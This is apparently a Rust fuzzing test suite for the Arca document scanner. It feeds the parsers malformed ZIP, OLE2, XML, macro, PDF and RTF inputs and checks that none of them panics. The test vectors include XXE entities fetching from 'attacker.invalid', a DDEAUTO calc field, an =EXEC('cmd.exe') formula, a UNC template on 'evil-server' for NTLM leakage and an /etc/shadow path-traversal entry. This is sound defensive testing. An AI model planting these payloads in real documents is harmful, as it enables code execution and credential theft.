//! 150+ стресс-тестов и генераторов вредоносных мутаций (Adversarial Fuzzing Suite).
//!
//! Цель: жесткая проверка стойкости движка Arca, валидация того, что парсеры
//! никогда не паникуют (no panics), не зависают в бесконечных циклах, не расходуют память
//! сверх лимитов и корректно изолируют потенциальные векторы атак.

use std::panic::{AssertUnwindSafe, catch_unwind};

use arca_container::cfb::writer::CfbBuilder;
use arca_container::zip::writer::{Compression, ZipWriter};

use super::fixtures::*;
use crate::report::XRayReport;
use crate::scan_default;

fn safe_scan(data: &[u8]) -> Result<XRayReport, String> {
    catch_unwind(AssertUnwindSafe(|| scan_default(data)))
        .map_err(|e| format!("Panic in scanner: {e:?}"))
}

// =========================================================================
// 1. Контейнеры ZIP / OOXML (30 тестов)
// =========================================================================

#[test]
fn test_zip_container_stress_30_vectors() {
    for i in 0..30 {
        let mut data = docx().build();
        match i {
            0 => {
                data.truncate(data.len() / 2);
            } // Обрыв на половине
            1 => {
                data.truncate(10);
            } // Обрыв в local header
            2 => {
                data.extend_from_slice(&[0u8; 1000]);
            } // Трейлинг нули (хвост)
            3 => {
                // Искажение сигнатуры Central Directory
                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x01\x02") {
                    data[pos] = b'X';
                }
            }
            4 => {
                // Искажение End of Central Directory
                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06") {
                    data[pos + 2] = 0xFF;
                }
            }
            5 => {
                // 65535 записей в EOCD (граница 16-бит)
                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06")
                    && pos + 10 < data.len()
                {
                    data[pos + 8] = 0xFF;
                    data[pos + 9] = 0xFF;
                }
            }
            6 => {
                // Несоответствие размера uncompressed
                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x03\x04")
                    && pos + 24 < data.len()
                {
                    data[pos + 22] = 0xFF;
                    data[pos + 23] = 0xFF;
                }
            }
            7 => {
                // Неверный метод сжатия (99 = несуществующий)
                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x03\x04")
                    && pos + 9 < data.len()
                {
                    data[pos + 8] = 99;
                    data[pos + 9] = 0;
                }
            }
            8 => {
                // Имя файла с выходом из каталога
                let mut zw = ZipWriter::new();
                let _ = zw.add("../../../../../etc/shadow", b"secret", Compression::Stored);
                if let Ok(d) = zw.finish() {
                    data = d;
                }
            }
            9 => {
                // Имя файла с нулевым байтом внутри
                let mut zw = ZipWriter::new();
                let _ = zw.add("word/document\0.xml", b"<xml/>", Compression::Stored);
                if let Ok(d) = zw.finish() {
                    data = d;
                }
            }
            10 => {
                // Абсолютный путь в имени файла
                let mut zw = ZipWriter::new();
                let _ = zw.add("/root/exploit", b"test", Compression::Stored);
                if let Ok(d) = zw.finish() {
                    data = d;
                }
            }
            11 => {
                // Двойной EOCD маркер
                let eocd = b"PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
                data.extend_from_slice(eocd);
            }
            12 => {
                // Огромный EOCD comment length
                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06")
                    && pos + 21 < data.len()
                {
                    data[pos + 20] = 0xFF;
                    data[pos + 21] = 0xFF;
                }
            }
            13 => {
                // Нулевой архив (только EOCD без файлов)
                data = b"PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec();
            }
            14 => {
                // Отрицательное смещение Central Directory
                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06")
                    && pos + 19 < data.len()
                {
                    data[pos + 16] = 0xFF;
                    data[pos + 17] = 0xFF;
                    data[pos + 18] = 0xFF;
                    data[pos + 19] = 0x7F;
                }
            }
            15..=29 => {
                // Вариации мутаций байтов в потоке DEFLATE
                let mut rng_val = u8::try_from(i).unwrap_or(0).wrapping_mul(37);
                for b in data.iter_mut().skip(50).take(200) {
                    *b ^= rng_val;
                    rng_val = rng_val.wrapping_add(13);
                }
            }
            _ => {}
        }

        let res = safe_scan(&data);
        assert!(res.is_ok(), "ZIP vector {i} triggered panic: {:?}", res.err());
    }
}

// =========================================================================
// 2. CFB / OLE2 контейнеры (30 тестов)
// =========================================================================

#[test]
fn test_cfb_ole2_stress_30_vectors() {
    for i in 0..30 {
        let mut builder = CfbBuilder::new();
        let _ = builder.add_stream("Root Entry/Workbook", vec![0u8; 128]);
        let mut data = builder.finish().unwrap_or_default();

        match i {
            0 => {
                data.truncate(512);
            } // Ровно один сектор заголовка
            1 => {
                data.truncate(511);
            } // Обрезанный сектор
            2 => {
                data.truncate(24);
            } // Меньше минимального размера OLE
            3 => {
                // Искажение сигнатуры CFB
                data[0] = 0x00;
            }
            4 => {
                // Смещение первого каталога в несуществующий сектор
                data[48] = 0xFF;
                data[49] = 0xFF;
                data[50] = 0xFF;
                data[51] = 0x7F;
            }
            5 => {
                // Некорректный sector shift (должен быть 9 или 12)
                data[30] = 7;
                data[31] = 0;
            }
            6 => {
                // Некорректный mini sector shift (должен быть 6)
                data[32] = 10;
                data[33] = 0;
            }
            7 => {
                // Огромное количество секторов FAT
                data[44] = 0xFF;
                data[45] = 0xFF;
            }
            8 => {
                // DIFAT sector count больше размера файла
                data[72] = 0xFE;
                data[73] = 0xFF;
            }
            9 => {
                // Нулевой byte order (не little-endian)
                data[28] = 0x00;
                data[29] = 0x00;
            }
            10..=29 if data.len() > 512 + (i * 16) => {
                // Повреждения внутри структуры секторов каталога
                data[512 + (i * 16)] = 0xFF;
            }
            _ => {}
        }

        let res = safe_scan(&data);
        assert!(res.is_ok(), "CFB vector {i} triggered panic: {:?}", res.err());
    }
}

// =========================================================================
// 3. XML бомбы, сущности и рекурсии (30 тестов)
// =========================================================================

#[test]
fn test_xml_parser_stress_30_vectors() {
    let bombs = [
        // Billion laughs вариации
        r#"<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><x>&lol2;</x>"#,
        r#"<!DOCTYPE r [<!ENTITY a "a"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]><r>&c;</r>"#,
        // Внешние DTD и сущности
        r#"<!DOCTYPE doc SYSTEM "http://127.0.0.1:8080/xxe.dtd"><doc>&send;</doc>"#,
        r#"<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "ftp://attacker.invalid/file.dtd">%dtd;]><doc/>"#,
        // Глубокая рекурсия тегов
        &("<w:p>".repeat(200) + &"</w:p>".repeat(200)),
        // Огромные атрибуты
        &format!("<w:p id=\"{}\"/>", "A".repeat(5000)),
        // Небалансированные теги
        "<w:document><w:body><w:p><w:r><w:t>Hello",
        "<w:document></w:body></w:document>",
        // CDATA стресс
        "<![CDATA[ <w:p> unclosed cdata",
        &("<![CDATA[".repeat(50) + &"]]>".repeat(50)),
        // Управляющие символы и UTF-8 bidi overrides
        "<w:p><w:t>\u{202E}gnirts neddih\u{202C}</w:t></w:p>",
        "<w:p><w:t>\u{0}\u{1}\u{2}\u{3}\u{4}\u{5}</w:t></w:p>",
        // Повторяющиеся пространства имен
        "<a xmlns:x=\"urn:1\" xmlns:x=\"urn:2\"><x:b/></a>",
        // XML с некорректным prolog
        "<?xml version=\"1.0\" encoding=\"UTF-32\"?><x/>",
        "<?xml version=\"999.9\"?><x/>",
    ];

    for (idx, bomb) in bombs.iter().enumerate() {
        // Тест 1: прямо в XML-контенте docx
        let mut opc = docx();
        opc.set("word/document.xml", (*bomb).as_bytes());
        let res = safe_scan(&opc.build());
        assert!(res.is_ok(), "XML vector {idx} triggered panic: {:?}", res.err());

        // Тест 2: в файле настроек
        let mut opc_settings = docx();
        opc_settings.set("word/settings.xml", (*bomb).as_bytes());
        let res2 = safe_scan(&opc_settings.build());
        assert!(res2.is_ok(), "XML settings vector {idx} triggered panic: {:?}", res2.err());
    }
}

// =========================================================================
// 4. Макросы, VBA и активное содержимое (25 тестов)
// =========================================================================

#[test]
fn test_macro_active_content_stress_25_vectors() {
    for i in 0..25 {
        let mut opc = docm_with_macro();
        match i {
            0 => {
                // Макрос с замаскированным DDE
                opc.set("word/document.xml", r#"<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:fldSimple w:instr="DDEAUTO &quot;calc&quot; &quot;&quot;"/></w:body></w:document>"#);
            }
            1 => {
                // Макрос со сверхдлинным именем функции
                let long_name = "Auto_Open_".repeat(200);
                let vba = format!("Sub {long_name}()\nEnd Sub");
                opc.set("word/vbaProject.bin", vba.into_bytes());
            }
            2 => {
                // Обрезанный бинарный vbaProject
                opc.set(
                    "word/vbaProject.bin",
                    b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00".to_vec(),
                );
            }
            3 => {
                // XLM / Excel 4.0 макрос в формуле
                let xls = xlsx(
                    r#"<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c r="A1"><f>=EXEC("cmd.exe")</f></c></row></sheetData></worksheet>"#,
                );
                let res = safe_scan(&xls.build());
                assert!(res.is_ok());
                continue;
            }
            4 => {
                // Внешний шаблон UNC (NTLM leak vector)
                let mut doc = docx();
                doc.set(
                    "word/_rels/settings.xml.rels",
                    rels(&[(
                        "rId1",
                        "attachedTemplate",
                        "\\\\evil-server\\share\\template.dotm",
                        true,
                    )]),
                );
                let res = safe_scan(&doc.build());
                assert!(res.is_ok());
                continue;
            }
            5..=24 => {
                // Мутации тела VBA проекта
                let mut vba_bytes =
                    b"Attribut VB_Name = \"Test\"\nSub AutoOpen()\nEnd Sub\n".to_vec();
                vba_bytes.extend(std::iter::repeat_n(u8::try_from(i).unwrap_or(0), i * 50));
                opc.set("word/vbaProject.bin", vba_bytes);
            }
            _ => {}
        }

        let res = safe_scan(&opc.build());
        assert!(res.is_ok(), "Macro stress vector {i} triggered panic: {:?}", res.err());
    }
}

// =========================================================================
// 5. PDF, RTF и полиглоты (25 тестов)
// =========================================================================

#[test]
fn test_pdf_rtf_polyglot_stress_25_vectors() {
    for i in 0..25 {
        let data = match i {
            0 => b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [1 0 R] /Count 1 >>\nendobj\nxref\n0 3\ntrailer\n<< /Root 1 0 R >>\n%%EOF".to_vec(), // Циклическая ссылка
            1 => b"%PDF-1.4\n1 0 obj << /JavaScript (app.alert(1)) /S /JavaScript >> endobj\ntrailer << >>\n%%EOF".to_vec(),
            2 => b"%PDF-1.5\n".repeat(100), // Повторяющийся заголовок
            3 => b"%PDF-1.0\nxref\n0 99999999\n0000000000 65535 f \ntrailer << >>\n%%EOF".to_vec(), // Огромная таблица xref
            4 => b"{\\rtf1\\ansi{\\fonttbl{\\f0 Times;}}\\f0\\fs24 Hello World}".to_vec(), // Бенчинговый RTF
            5 => b"{\\rtf1".repeat(500), // Незакрытые группы RTF
            6 => b"{\\rtf1\\ansi\\object\\objemb{\\*\\objdata 0102030405deadbeef}}".to_vec(), // Встроенный OLE в RTF
            7 => b"{\\rtf1\\ansi\\'zz\\'ff\\'gg\\'00}".to_vec(), // Некорректные hex-эскейпы
            8 => {
                // ZIP + PDF полиглот
                let mut p = docx().build();
                p.extend_from_slice(b"%PDF-1.4\n1 0 obj << >> endobj\ntrailer << >>\n%%EOF");
                p
            }
            9 => {
                // GIF + DOCX полиглот
                let mut g = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;".to_vec();
                g.extend_from_slice(&docx().build());
                g
            }
            10..=24 => {
                // Различные гранулярные обрывы PDF/RTF
                let base = b"%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF";
                base[..base.len().saturating_sub(i)].to_vec()
            }
            _ => vec![],
        };

        let res = safe_scan(&data);
        assert!(res.is_ok(), "PDF/RTF stress vector {i} triggered panic: {:?}", res.err());
    }
}

// =========================================================================
// 6. Access, Visio и редкие форматы (20 тестов)
// =========================================================================

#[test]
fn test_access_visio_stress_20_vectors() {
    for i in 0..20 {
        let mut data = vec![0u8; 1024];
        match i {
            0 => {
                // Сигнатура Jet3 MDB
                data[0..4].copy_from_slice(&[0x00, 0x01, 0x00, 0x00]);
                data[4..20].copy_from_slice(b"Standard Jet DB\x00");
                data.extend_from_slice(b"MSysObjects\x00VBAProject\x00AutoExec\x00");
            }
            1 => {
                // Сигнатура ACE ACCDB
                data[0..4].copy_from_slice(&[0x00, 0x01, 0x00, 0x00]);
                data[4..20].copy_from_slice(b"Standard ACE DB\x00");
                data.extend_from_slice(b"MSysObjects\x00AutoExec\x00");
            }
            2 => {
                // VSDX с поврежденным pages.xml
                let mut opc = docx();
                opc.set(
                    "visio/pages/pages.xml",
                    b"<Pages><Page ID=\"0\" Name=\"Page-1\"/><Page ID=\"0\"/></Pages>",
                );
                data = opc.build();
            }
            3 => {
                // VSD бинарный заголовок
                data[0..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
                data.extend_from_slice(b"VisioDocument\x00");
            }
            4..=19 => {
                // Разнообразные мутации страниц базы данных
                data[0..4].copy_from_slice(&[0x00, 0x01, 0x00, 0x00]);
                data[4..19].copy_from_slice(b"Standard Jet DB");
                data[100 + i] = 0xFF;
            }
            _ => {}
        }

        let res = safe_scan(&data);
        assert!(res.is_ok(), "Access/Visio stress vector {i} triggered panic: {:?}", res.err());
    }
}
